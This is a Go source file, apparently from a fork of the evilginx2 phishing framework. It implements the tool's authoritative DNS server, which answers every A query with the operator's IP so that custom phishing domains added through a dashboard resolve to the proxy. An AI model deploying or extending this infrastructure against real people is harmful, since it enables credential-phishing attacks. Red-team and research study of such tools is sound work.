package core

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"

	"github.com/kgretzky/evilginx2/log"
)

type Nameserver struct {
	serial       uint32
	bind         string
	srv          *dns.Server
	cfg          *Config
	ctx          context.Context
	servedZones  map[string]bool // DNS zones with a handler registered (miekg panics on duplicates)
}

func NewNameserver(cfg *Config) (*Nameserver, error) {
	o := &Nameserver{
		serial:      uint32(time.Now().Unix()),
		cfg:         cfg,
		bind:        fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
		ctx:         context.Background(),
		servedZones: make(map[string]bool),
	}

	o.Reset()

	return o, nil
}

func (o *Nameserver) Reset() {
	// Serve the server's base domain plus every dashboard-managed domain so
	// custom phishing domains resolve through evilginx's authoritative DNS.
	o.registerZone(o.cfg.general.Domain)
	for _, d := range o.cfg.GetDomainSettings().Domains {
		o.registerZone(d)
	}
}

// registerZone registers a DNS handler for a domain zone exactly once.
// (dns.HandleFunc panics if the same pattern is registered twice.)
func (o *Nameserver) registerZone(domain string) {
	domain = strings.ToLower(strings.TrimSpace(domain))
	if domain == "" || o.servedZones[domain] {
		return
	}
	dns.HandleFunc(pdom(domain), o.handleRequest)
	o.servedZones[domain] = true
}

// RegisterDomain adds a new DNS zone at runtime (dashboard "Add domain").
func (o *Nameserver) RegisterDomain(domain string) {
	o.registerZone(domain)
}

func (o *Nameserver) Start() {
	go func() {
		o.srv = &dns.Server{Addr: o.bind, Net: "udp"}
		if err := o.srv.ListenAndServe(); err != nil {
			log.Fatal("Failed to start nameserver on: %s", o.bind)
		}
	}()
}

func (o *Nameserver) handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	if o.cfg.general.Domain == "" || o.cfg.general.ExternalIpv4 == "" {
		return
	}

	soa := &dns.SOA{
		Hdr:     dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
		Ns:      "ns1." + pdom(o.cfg.general.Domain),
		Mbox:    "hostmaster." + pdom(o.cfg.general.Domain),
		Serial:  o.serial,
		Refresh: 900,
		Retry:   900,
		Expire:  1800,
		Minttl:  60,
	}
	m.Ns = []dns.RR{soa}

	fqdn := strings.ToLower(r.Question[0].Name)

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		log.Debug("DNS SOA: " + fqdn)
		m.Answer = append(m.Answer, soa)
	case dns.TypeA:
		log.Debug("DNS A: " + fqdn + " = " + o.cfg.general.ExternalIpv4)
		rr := &dns.A{
			Hdr: dns.RR_Header{Name: fqdn, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
			A:   net.ParseIP(o.cfg.general.ExternalIpv4),
		}
		m.Answer = append(m.Answer, rr)
	case dns.TypeNS:
		log.Debug("DNS NS: " + fqdn)
		if fqdn == pdom(o.cfg.general.Domain) {
			for _, i := range []int{1, 2} {
				rr := &dns.NS{
					Hdr: dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 300},
					Ns:  "ns" + strconv.Itoa(i) + "." + pdom(o.cfg.general.Domain),
				}
				m.Answer = append(m.Answer, rr)
			}
		}
	}
	w.WriteMsg(m)
}

func pdom(domain string) string {
	return domain + "."
}
